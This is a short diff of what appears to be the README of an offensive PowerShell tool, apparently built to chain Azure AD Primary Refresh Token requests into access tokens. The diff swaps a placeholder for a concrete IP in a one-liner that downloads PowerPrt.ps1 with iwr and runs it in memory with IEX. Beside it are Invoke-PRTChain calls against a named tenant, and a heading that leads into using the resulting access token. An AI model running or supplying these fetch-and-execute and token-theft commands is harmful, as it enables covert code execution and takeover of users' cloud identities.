@@ -247,7 +247,7 @@ Invoke-PRTChain -TenantId "contoso.onmicrosoft.com" -Nonce "AQABAAAAAAD..."
 Invoke-PRTChain -TenantId "contoso.onmicrosoft.com" -Legacy
 
 # full chain one-liner via IEX
-IEX (iwr http://<host>/PowerPrt.ps1 -UseBasicParsing); Invoke-PRTChain -TenantId "contoso.onmicrosoft.com"
+IEX (iwr http://192.168.23.1/PowerPrt.ps1 -UseBasicParsing); Invoke-PRTChain -TenantId "contoso.onmicrosoft.com"
 ```
 
 ### Using the Access Token
